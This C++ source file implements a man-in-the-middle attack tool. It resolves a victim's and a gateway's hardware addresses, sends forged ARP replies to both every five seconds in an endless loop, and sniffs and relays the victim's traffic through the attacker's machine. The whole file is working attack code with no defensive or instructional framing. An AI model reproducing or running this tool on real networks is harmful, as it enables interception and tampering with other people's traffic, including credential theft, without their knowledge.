//
// Created by root on 6/13/16.
//

#include "MITM.h"

// Initializer
MITM::MITM(char *_gateway, char *_victim) {
    try {
        gateway = _gateway;
        victim = _victim;
        iface = gateway;
        myInfo = iface.addresses();
    } catch(runtime_error& error) {
        fprintf(stderr, "[*] Please input ip address correctly!!\n");
        exit(1);
    }
    pSender.default_interface("wlan0");
    gateway_hw = Utils::resolve_hwaddr(iface, gateway, pSender);
    victim_hw = Utils::resolve_hwaddr(iface, victim, pSender);
    config.set_promisc_mode(false);
    config.set_filter(string("ip dst " + victim.to_string() + " or ip src " + victim.to_string()));
    clog << "[*] Sniffer ready" << endl;
}

void MITM::startARPSpoofing() {
    cout << "[*][*] MITM Attack Configure" << endl;
    clog << "[*] Own        => " << myInfo.ip_addr << " - " << myInfo.hw_addr << endl;
    clog << "[*] Gateway    => " << gateway << " - " << gateway_hw << endl;
    clog << "[*] Victim     => " << victim << " - " << victim_hw << endl;

    ARP arp_toGateway(gateway, victim, gateway_hw, myInfo.hw_addr), arp_toVictim(victim, gateway, victim_hw, myInfo.hw_addr);
    arp_toGateway.opcode(ARP::REPLY);
    arp_toVictim.opcode(ARP::REPLY);

    // Generate Ethernet Packet for Capsulation
    EthernetII eth_toGateway = EthernetII(gateway_hw, myInfo.hw_addr) / arp_toGateway;
    EthernetII eth_toVictim  = EthernetII(victim_hw, myInfo.hw_addr) / arp_toVictim;

    cout << "[*][*] ARP Spoofing Attack Start" << endl;

    while(true) {
        pSender.send(eth_toGateway, iface);
        pSender.send(eth_toVictim, iface);
        clog << "[*] Do ARP Spoofing" << endl;
        this_thread::sleep_for(chrono::seconds(5));
    }
}

void MITM::startMITM() {
    this_thread::sleep_for(chrono::seconds(5));
    Sniffer sniffer("wlan0", config);
    clog << "[*] Start Sniffing" << endl;
    sniffer.sniff_loop(make_sniffer_handler(this, &MITM::packetHandler));
}

bool MITM::packetHandler(PDU &pdu) {
    clog << pdu.rfind_pdu<EthernetII>().src_addr() << " => " << pdu.rfind_pdu<EthernetII>().dst_addr() << endl;
    try {
        if(pdu.rfind_pdu<EthernetII>().src_addr() == victim_hw) { // [Victim] => [GW]
            clog << "Victim => GW" << endl;
            pdu.rfind_pdu<EthernetII>().dst_addr(gateway_hw);
            pdu.rfind_pdu<EthernetII>().src_addr(myInfo.hw_addr);
            pSender.send(pdu); // [MY_HW] => [GW_HW]
            clog << "Packet sended" << endl;
        }
        else if (pdu.rfind_pdu<EthernetII>().src_addr() == gateway_hw) { // [GW] => [Victim]
            clog << "GW => Victim" << endl;
            pdu.rfind_pdu<EthernetII>().dst_addr(victim_hw);
            pSender.send(pdu); // [MY_HW] => [GW_HW]
            clog << "Packet sended" << endl;
        }
    } catch(runtime_error& error) {
        clog << "Error, Restart" << endl;
    }
    return true;
}